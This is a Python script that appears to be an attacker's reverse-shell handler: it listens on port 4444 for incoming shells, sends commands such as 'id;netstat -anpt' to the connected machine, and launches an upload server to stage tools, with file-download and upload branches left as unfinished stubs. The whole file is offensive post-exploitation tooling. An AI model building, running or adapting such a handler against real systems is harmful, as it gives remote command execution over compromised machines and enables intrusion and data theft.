#!/usr/bin/env python3

import socket, time
import random, string
import subprocess as sub
import threading
import logging
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

import telnetlib

logging.basicConfig(format="[*] %(asctime)s - %(levelname)-8s%(message)s",
                    level=logging.DEBUG)

class cmdtype:
    EXEC_CMD = 1
    GET      = 2
    PUT      = 3

def rand_string(length=12):
    return "".join(random.choices(string.ascii_letters+string.digits, k=length))
    
class shellserver:
    def __init__(self, port):
        self.port    = port
        self.ssock   = None
        self.DELIM   = rand_string().encode()
        self.server(port)


    def once_interact(self, cs, idata):
        delim=self.DELIM+b"\n"
        cs.write(idata.strip().encode() + b";echo " + delim)
        return cs.read_until(delim)

    def dispatch(self, cs, command, **kwargs):
        match (command):
            case (cmdtype.EXEC_CMD):
                # execute shell command
                idata = kwargs["cmd"]
            case (cmdtype.GET):
                # get/download file
                # idata = "wget "
                pass
            case (cmdtype.PUT):
                # put/upload file
                pass
            case (_):
                logging.info("Unsupported command operations")
        # end match

        print(self.once_interact(cs, idata).decode())

    def server(self, port):
        self.ssock = socket.create_server(("", port), reuse_port=True)


    def interactive(self, method=None, **kwargs):
        while True:
            conn, addr  = self.ssock.accept()
            cs          = telnetlib.Telnet()
            cs.sock     = conn
            time.sleep(0.05)
            if method:
                self.dispatch(cs, method, cmd=kwargs["cmd"])
            else:
                cs.interact()


def create_httpserver():
    p = sub.Popen(
        ["python3", "-m", "uploadserver", "-d", "tools"],
        stdout=sub.PIPE,
        stderr=sub.PIPE,
        stdin=sub.PIPE
    )
    return p

def start_http(p):
    while p.poll() is None:
        logging.info(p.stderr.readline().decode().strip())
    
def stop_httpserver(p):
    p.kill()


def test_shellserver():
    ss = shellserver(4444)
    # ss.interactive()  # interactive
    ss.interactive(cmdtype.EXEC_CMD, cmd="id;netstat -anpt")
    ss.interactive(cmdtype.GET, remote="/bin/busybox", local="/tmp/abc")

def test_httpserver():
    httpd = create_httpserver()
    try:
        t = threading.Thread(target=start_http, args=(httpd,))
        t.start()
        t.join()
    except KeyboardInterrupt:
        stop_httpserver(httpd)
        print("stop http server")

if __name__ == "__main__":
    # test_shellserver()
    test_httpserver()